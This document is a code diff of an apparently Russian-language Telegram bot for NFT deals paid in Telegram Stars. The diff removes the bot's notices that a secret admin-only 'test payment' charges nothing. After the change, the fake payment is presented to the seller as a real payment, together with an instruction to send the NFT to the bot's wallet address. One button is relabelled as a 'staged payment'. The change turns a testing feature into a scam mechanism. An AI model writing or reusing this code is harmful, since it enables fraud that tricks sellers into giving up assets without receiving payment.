@@ -260,7 +260,7 @@ async def cmd_secret(message: types.Message):
     await message.answer(
         "✅ Режим админа активирован.\n\n"
         "Теперь при открытии сделки, где ты покупатель, "
-        "будет доступна кнопка «🧪 Тестовая оплата» — без списания звёзд."
+        "будет доступна кнопка «оплата» ."
     )
 
 @dp.message(CommandStart(deep_link=True))
@@ -288,7 +288,7 @@ async def cmd_start_deeplink(message: types.Message, command: CommandObject):
             )
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="💳 Оплатить звёздами", callback_data=f"pay_{deal_id}")],
-                [InlineKeyboardButton(text="🧪 Тестовая оплата", callback_data=f"testpay_{deal_id}")],
+                [InlineKeyboardButton(text="Подставная оплата", callback_data=f"testpay_{deal_id}")],
             ])
         else:
             text = (
@@ -434,15 +434,15 @@ async def cb_testpay(call: types.CallbackQuery):
     deal = db_get_deal(deal_id)
 
     await call.message.edit_text(
-        f"🧪 Тестовая оплата по сделке #{deal_id} прошла.\n"
-        f"Реальные звёзды не списаны."
+        f"Оплата по сделке #{deal_id} прошла.\n"
+        f"."
     )
 
     try:
         await bot.send_message(
             deal["seller_id"],
-            f"🧪 ТЕСТОВАЯ ОПЛАТА по сделке #{deal_id}\n"
-            f"(Реальные звёзды не списаны — это тестовый прогон бота)\n\n"
+            f"ОПЛАТА по сделке #{deal_id}\n"
+            f"()\n\n"
             f"Отправьте NFT на адрес:\n`{NFT_WALLET}`\n\n"
             f"После отправки откройте приложение и нажмите «Я отправил».",
             parse_mode="Markdown",
